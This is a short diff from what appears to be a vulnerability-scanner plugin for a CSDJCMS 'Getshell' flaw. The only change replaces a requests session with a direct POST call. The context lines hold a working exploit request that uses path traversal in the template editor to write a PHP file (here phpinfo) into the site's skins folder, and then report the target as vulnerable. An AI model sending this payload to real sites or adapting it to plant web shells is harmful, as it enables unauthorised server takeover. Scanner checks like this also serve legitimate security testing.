@@ -45,8 +45,7 @@ def medusa(Url,RandomAgent,Token,proxies=None):
             "Content-Length": "169"
         }
         data = "FileName=cs-bottom.php&content=%3C%3Fphp+phpinfo+%3F%3E&folder=..%2Fskins%2Findex%2Fhtml%2F&tempname=%C4%AC%C8%CF%C4%A3%B0%E6&Submit=%D0%DE%B8%C4%B5%B1%C7%B0%C4%A3%B0%E5"
-        s = requests.session()
-        resp = s.post(payload_url, data=data,headers=headers,proxies=proxies, timeout=6, verify=False)
+        resp = requests.post(payload_url, data=data,headers=headers,proxies=proxies, timeout=6, verify=False)
         con = resp.text
         if con.find('PHP Version') != -1 and con.find('System') !=-1 and con.find('Configure Command') != -1:
             Medusa = "{}存在CSDJCMSGetshell\r\n漏洞地址:\r\n{}\r\n漏洞详情:{}\r\n".format(url, payload_url, con)
